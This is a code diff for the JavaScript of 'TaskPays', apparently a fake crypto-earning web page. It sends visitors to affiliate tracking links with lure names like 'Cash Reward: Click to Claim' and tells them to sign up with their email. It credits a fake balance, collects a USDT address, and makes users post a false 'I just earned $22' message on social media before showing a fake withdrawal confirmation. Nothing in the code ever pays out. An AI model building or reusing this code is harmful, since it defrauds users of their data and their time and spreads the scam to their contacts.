+                        { id: 6, name: "🤑 Cash Reward: Click to Claim", url: "https://t.ancdu.link/140699/7162?aff_sub5=SF_006OG000004lmDN" },
+                        { id: 7, name: "🏆 Elite Members Only", url: "https://t.ancdu.link/140699/9062/0?aff_sub5=SF_006OG000004lmDN" },
+                        { id: 8, name: "🚀 Boost Your Earnings Now", url: "https://t.ancdu.link/140699/7163?aff_sub5=SF_006OG000004lmDN" },
+                        { id: 9, name: "🎯 Limited Slots Available!", url: "https://t.ancdu.link/140699/9064/0?aff_sub5=SF_006OG000004lmDN" },
+                        { id: 10, name: "💳 Exclusive Credit Offer", url: "https://t.ancdu.link/140699/7161?aff_sub5=SF_006OG000004lmDN" },
+                        { id: 11, name: "🛎️ Personal Concierge Access", url: "https://t.ancdu.link/140699/7809/0?aff_sub5=SF_006OG000004lmDN" }
+                    ];
+
+                    if (clickedTasks.length === 0) {
+                        clickedTasks = new Array(tasks.length).fill(false);
+                    }
+                    
+                    const taskContainer = document.getElementById("task-links");
+                    const statusEl = document.getElementById("status");
+                    const balanceEl = document.getElementById("balance-amount");
+                    const withdrawBtn = document.getElementById("withdraw-btn");
+
+                    tasks.forEach((task, index) => {
+                        const taskDiv = document.createElement("div");
+                        taskDiv.className = "task-container";
                         
-                        balance += rewardPerTask;
-                        balanceEl.textContent = `$${balance}`;
-                        completedTasks++;
-                        updateProgress();
+                        const taskLink = document.createElement("a");
+                        taskLink.href = "#";
+                        taskLink.className = "task-link";
+                        if (clickedTasks[index]) {
+                            taskLink.classList.add("clicked");
+                        }
+                        taskLink.textContent = task.name;
+                        taskLink.onclick = (e) => handleTaskClick(e, task, index, taskDiv);
+                        
+                        const timerSpan = document.createElement("span");
+                        timerSpan.className = "timer";
+                        timerSpan.style.display = "none";
+                        
+                        const instruction = document.createElement("div");
+                        instruction.className = "task-instruction";
+                        instruction.textContent = '(Enter your email address and click "UNLOCK MY MATCHES" or "SIGNUP")';
+                        
+                        const completionCheck = document.createElement("div");
+                        completionCheck.className = "completion-check";
+                        completionCheck.id = `completion-check-${task.id}`;
+                        completionCheck.style.display = "none";
+                        completionCheck.innerHTML = `
+                            <p>Did you complete ALL steps of this offer?</p>
+                            <button class="confirmation-btn" onclick="markTaskComplete(${index}, ${task.id})">
+                                <i class="fas fa-check"></i> Yes, I Completed It
+                            </button>
+                        `;
+                        
+                        taskDiv.appendChild(taskLink);
+                        taskDiv.appendChild(timerSpan);
+                        taskDiv.appendChild(instruction);
+                        taskDiv.appendChild(completionCheck);
+                        taskContainer.appendChild(taskDiv);
+                    });
+
+                    function updateProgress() {
+                        statusEl.textContent = `${completedTasks}/${tasks.length} offers completed.`;
+                        
+                        if (completedTasks === tasks.length) {
+                            withdrawBtn.disabled = false;
+                            withdrawBtn.classList.add("active");
+                        }
+                        
                         saveProgress();
                     }
-                };
-            }
 
-            function handleTaskClick(e, task, index, taskDiv) {
-                e.preventDefault();
-                if (!clickedTasks[index]) {
-                    const timer = taskDiv.querySelector('.timer');
-                    timer.style.display = "inline-block";
-                    
-                    const offerWindow = window.open(task.url, '_blank', 'noopener,noreferrer');
-                    offerWindows[index] = offerWindow;
-                    
-                    // Show spinner for 30 seconds before showing completion check
-                    setTimeout(() => {
-                        try {
-                            if (offerWindows[index] && !offerWindows[index].closed) {
-                                offerWindows[index].focus();
-                            }
-                        } catch (e) {
-                            console.log("Offer window already closed");
+                    window.markTaskComplete = function(index, taskId) {
+                        if (!clickedTasks[index]) {
+                            clickedTasks[index] = true;
+                            document.querySelectorAll('.task-link')[index].classList.add('clicked');
+                            document.getElementById(`completion-check-${taskId}`).style.display = 'none';
+                            
+                            balance += rewardPerTask;
+                            balanceEl.textContent = `$${balance}`;
+                            completedTasks++;
+                            updateProgress();
+                            saveProgress();
                         }
+                    };
+                }
+
+                function handleTaskClick(e, task, index, taskDiv) {
+                    e.preventDefault();
+                    if (!clickedTasks[index]) {
+                        const timer = taskDiv.querySelector('.timer');
+                        timer.style.display = "inline-block";
                         
-                        document.getElementById(`completion-check-${task.id}`).style.display = 'block';
-                        timer.style.display = "none";
-                    }, 30000); // 30 seconds
-                }
-            }
-
-            // ===== WITHDRAWAL SYSTEM =====
-            document.getElementById("withdraw-btn").addEventListener("click", function() {
-                if (this.classList.contains("active")) {
-                    document.getElementById("withdraw-form").style.display = "block";
-                }
-            });
-
-            document.getElementById("submit-payment").addEventListener("click", function() {
-                const usdtAddress = document.getElementById("usdt-address").value.trim();
-                
-                if (!/^T[a-zA-Z1-9]{33}$/.test(usdtAddress)) {
-                    alert("❌ Please enter a valid USDT (TRC20) address starting with 'T' and 34 characters long.");
-                    return;
-                }
-                
-                if (balance < MIN_WITHDRAWAL) {
-                    alert(`❌ Minimum withdrawal is $${MIN_WITHDRAWAL}. Your balance: $${balance}`);
-                    return;
-                }
-                
-                document.getElementById("social-share-modal").style.display = "flex";
-                document.getElementById("pending-amount").textContent = MIN_WITHDRAWAL;
-            });
-
-            // ===== SOCIAL SHARING =====
-            window.shareOnPlatform = function(platform) {
-                const shareData = {
-                    title: "🔥 Earn Free USDT with TaskPays!",
-                    text: "I just earned $22 in USDT by completing simple offers on TaskPays! 💰\n\n" +
-                          "✅ No investment required\n" +
-                          "✅ Instant withdrawals\n\n" +
-                          "Join now and claim your free money! #EarnOnline #FreeCrypto",
-                    url: "https://taskpays.netlify.app/"
-                };
-                
-                if (navigator.share && platform !== 'whatsapp' && platform !== 'telegram') {
-                    navigator.share({
-                        title: shareData.title,
-                        text: shareData.text,
-                        url: shareData.url
-                    })
-                    .then(() => {
-                        trackShareSuccess();
-                    })
-                    .catch(err => {
-                        console.log('Error sharing:', err);
-                        openShareWindow(platform, shareData);
-                    });
-                } else {
-                    openShareWindow(platform, shareData);
-                }
-            };
-
-            function trackShareSuccess() {
-                hasShared = true;
-                document.getElementById("share-tracking").style.display = 'block';
-                document.querySelector(".payment-status").innerHTML = `
-                    <p><strong>Pending</strong></p>
-                    <p>Amount: $<span id="pending-amount">${MIN_WITHDRAWAL}</span> USDT</p>
-                `;
-                document.getElementById("submit-after-share").style.display = 'block';
-            }
-
-            function openShareWindow(platform, shareData) {
-                let shareUrl;
-                
-                switch(platform) {
-                    case 'facebook':
-                        shareUrl = `https://www.facebook.com/sharer/sharer.php?u=${encodeURIComponent(shareData.url)}&quote=${encodeURIComponent(shareData.text)}`;
-                        break;
-                    case 'twitter':
-                        shareUrl = `https://twitter.com/intent/tweet?text=${encodeURIComponent(shareData.text + " " + shareData.url)}`;
-                        break;
-                    case 'whatsapp':
-                        shareUrl = `https://wa.me/?text=${encodeURIComponent(shareData.text + " " + shareData.url)}`;
-                        break;
-                    default:
-                        shareUrl = shareData.url;
-                }
-                
-                const shareWindow = window.open(shareUrl, '_blank', 'width=600,height=400');
-                
-                if (shareWindow) {
-                    const checkClosed = setInterval(() => {
-                        try {
-                            if (shareWindow.closed) {
-                                clearInterval(checkClosed);
-                                trackShareSuccess();
+                        const offerWindow = window.open(task.url, '_blank', 'noopener,noreferrer');
+                        offerWindows[index] = offerWindow;
+                        
+                        // Show spinner for 30 seconds before showing completion check
+                        setTimeout(() => {
+                            try {
+                                if (offerWindows[index] && !offerWindows[index].closed) {
+                                    offerWindows[index].focus();
+                                }
+                            } catch(e) {
+                                console.log("Offer window already closed");
                             }
-                        } catch (e) {
-                            clearInterval(checkClosed);
-                        }
-                    }, 1000);
+                            
+                            document.getElementById(`completion-check-${task.id}`).style.display = 'block';
+                            timer.style.display = "none";
+                        }, 30000); // 30 seconds
+                    }
                 }
-            }
 
-            document.getElementById("submit-after-share").addEventListener("click", function() {
-                if (!hasShared) {
-                    alert("Please complete the sharing requirement first");
-                    return;
+                // ===== WITHDRAWAL SYSTEM =====
+                document.getElementById("withdraw-btn").addEventListener("click", function() {
+                    if (this.classList.contains("active")) {
+                        document.getElementById("withdraw-form").style.display = "block";
+                    }
+                });
+
+                document.getElementById("submit-payment").addEventListener("click", function() {
+                    const usdtAddress = document.getElementById("usdt-address").value.trim();
+                    
+                    if (!/^T[a-zA-Z1-9]{33}$/.test(usdtAddress)) {
+                        alert("❌ Please enter a valid USDT (TRC20) address starting with 'T' and 34 characters long.");
+                        return;
+                    }
+                    
+                    if (balance < MIN_WITHDRAWAL) {
+                        alert(`❌ Minimum withdrawal is $${MIN_WITHDRAWAL}. Your balance: $${balance}`);
+                        return;
+                    }
+                    
+                    document.getElementById("social-share-modal").style.display = "flex";
+                    document.getElementById("pending-amount").textContent = MIN_WITHDRAWAL;
+                });
+
+                // ===== SOCIAL SHARING =====
+                window.shareOnPlatform = function(platform) {
+                    const shareData = {
+                        title: "🔥 Earn Free USDT with TaskPays!",
+                        text: "I just earned $22 in USDT by completing simple offers on TaskPays! 💰\n\n" +
+                              "✅ No investment required\n" +
+                              "✅ Instant withdrawals\n\n" +
+                              "Join now and claim your free money! #EarnOnline #FreeCrypto",
+                        url: "https://taskpays.netlify.app/"
+                    };
+                    
+                    if (navigator.share && platform !== 'whatsapp' && platform !== 'telegram') {
+                        navigator.share({
+                            title: shareData.title,
+                            text: shareData.text,
+                            url: shareData.url
+                        })
+                        .then(() => {
+                            trackShareSuccess();
+                        })
+                        .catch(err => {
+                            console.log('Error sharing:', err);
+                            openShareWindow(platform, shareData);
+                        });
+                    } else {
+                        openShareWindow(platform, shareData);
+                    }
+                };
+
+                function trackShareSuccess() {
+                    hasShared = true;
+                    document.getElementById("share-tracking").style.display = 'block';
+                    document.querySelector(".payment-status").innerHTML = `
+                        <p><strong>Pending</strong></p>
+                        <p>Amount: $<span id="pending-amount">${MIN_WITHDRAWAL}</span> USDT</p>
+                    `;
+                    document.getElementById("submit-after-share").style.display = 'block';
                 }
-                
-                document.getElementById("social-share-modal").style.display = "none";
-                generatePaymentProof();
-                
-                // Reset for next withdrawal
-                balance = 0;
-                hasShared = false;
-                document.getElementById("balance-amount").textContent = "$0";
-                document.getElementById("share-tracking").style.display = 'none';
+
+                function openShareWindow(platform, shareData) {
+                    let shareUrl;
+                    
+                    switch(platform) {
+                        case 'facebook':
+                            shareUrl = `https://www.facebook.com/sharer/sharer.php?u=${encodeURIComponent(shareData.url)}&quote=${encodeURIComponent(shareData.text)}`;
+                            break;
+                        case 'twitter':
+                            shareUrl = `https://twitter.com/intent/tweet?text=${encodeURIComponent(shareData.text + " " + shareData.url)}`;
+                            break;
+                        case 'whatsapp':
+                            shareUrl = `https://wa.me/?text=${encodeURIComponent(shareData.text + " " + shareData.url)}`;
+                            break;
+                        default:
+                            shareUrl = shareData.url;
+                    }
+                    
+                    const shareWindow = window.open(shareUrl, '_blank', 'width=600,height=400');
+                    
+                    if (shareWindow) {
+                        const checkClosed = setInterval(() => {
+                            try {
+                                if (shareWindow.closed) {
+                                    clearInterval(checkClosed);
+                                    trackShareSuccess();
+                                }
+                            } catch (e) {
+                                clearInterval(checkClosed);
+                            }
+                        }, 1000);
+                    }
+                }
+
+                document.getElementById("submit-after-share").addEventListener("click", function() {
+                    if (!hasShared) {
+                        alert("Please complete the sharing requirement first");
+                        return;
+                    }
+                    
+                    document.getElementById("social-share-modal").style.display = "none";
+                    generatePaymentProof();
+                    
+                    // Reset for next withdrawal
+                    balance = 0;
+                    hasShared = false;
+                    document.getElementById("balance-amount").textContent = "$0";
+                    document.getElementById("share-tracking").style.display = 'none';
+                    document.getElementById("submit-after-share").style.display = 'none';
+                    document.querySelector(".payment-status").innerHTML = `
+                        <p><strong>Pending</strong></p>
+                        <p>Amount: $<span id="pending-amount">${MIN_WITHDRAWAL}</span> USDT</p>
+                    `;
+                    
+                    // Reset tasks
+                    completedTasks = 0;
+                    clickedTasks.fill(false);
+                    document.getElementById("status").textContent = "0/11 offers completed.";
+                    document.querySelectorAll(".task-link").forEach(link => {
+                        link.classList.remove("clicked");
+                    });
+                    document.getElementById("withdraw-btn").disabled = true;
+                    document.getElementById("withdraw-btn").classList.remove("active");
+                    document.getElementById("withdraw-form").style.display = "none";
+                    
+                    // Clear saved progress
+                    localStorage.removeItem('taskpays_progress');
+                    
+                    alert(`✅ $${MIN_WITHDRAWAL} USDT withdrawal submitted!\n\nFunds will arrive within 24 hours.`);
+                });
+
+                // Initialize the app
+                initTasks();
+                startPaymentProofs();
+                document.getElementById("pending-amount").textContent = MIN_WITHDRAWAL;
                 document.getElementById("submit-after-share").style.display = 'none';
-                document.querySelector(".payment-status").innerHTML = `
-                    <p><strong>Pending</strong></p>
-                    <p>Amount: $<span id="pending-amount">${MIN_WITHDRAWAL}</span> USDT</p>
-                `;
-                
-                // Reset tasks
-                completedTasks = 0;
-                clickedTasks.fill(false);
-                document.getElementById("status").textContent = "0/11 offers completed.";
-                document.querySelectorAll(".task-link").forEach(link => {
-                    link.classList.remove("clicked");
-                });
-                document.getElementById("withdraw-btn").disabled = true;
-                document.getElementById("withdraw-btn").classList.remove("active");
-                document.getElementById("withdraw-form").style.display = "none";
-                
-                // Clear saved progress
-                localStorage.removeItem('taskpays_progress');
-                
-                alert(`✅ $${MIN_WITHDRAWAL} USDT withdrawal submitted!\n\nFunds will arrive within 24 hours.`);
-            });
+                document.getElementById("share-tracking").style.display = 'none';
 
-            // Initialize the app
-            initTasks();
-            startPaymentProofs();
-            document.getElementById("pending-amount").textContent = MIN_WITHDRAWAL;
-            document.getElementById("submit-after-share").style.display = 'none';
-            document.getElementById("share-tracking").style.display = 'none';
-
-            window.addEventListener('beforeunload', () => {
-                clearInterval(paymentProofInterval);
-                offerWindows.forEach(win => {
-                    try {
-                        if (win && !win.closed) win.close();
-                    } catch (e) {}
+                window.addEventListener('beforeunload', () => {
+                    clearInterval(paymentProofInterval);
+                    offerWindows.forEach(win => {
+                        try {
+                            if (win && !win.closed) win.close();
+                        } catch (e) {}
+                    });
                 });
-            });
+            }
         }
     </script>
 </body>
